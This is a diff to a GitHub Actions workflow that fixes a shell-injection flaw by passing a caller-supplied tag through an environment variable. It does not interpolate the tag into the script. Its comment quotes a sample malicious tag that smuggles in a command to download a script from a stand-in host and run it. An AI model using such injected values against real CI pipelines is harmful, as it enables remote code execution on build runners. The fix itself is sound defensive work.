@@ -23,9 +23,14 @@ jobs:
     steps:
       - name: Resolve tag
         id: resolve
+        # INPUT_TAG is caller-controlled, so it goes through the environment
+        # rather than being interpolated into the script body, where a tag like
+        # `v1"; curl evil.sh | sh; #` would execute (githubactions:S7630).
+        env:
+          INPUT_TAG: ${{ inputs.tag }}
         run: |
-          if [ -n "${{ inputs.tag }}" ]; then
-            TAG="${{ inputs.tag }}"
+          if [ -n "$INPUT_TAG" ]; then
+            TAG="$INPUT_TAG"
           else
             TAG="${GITHUB_REF#refs/tags/}"
           fi
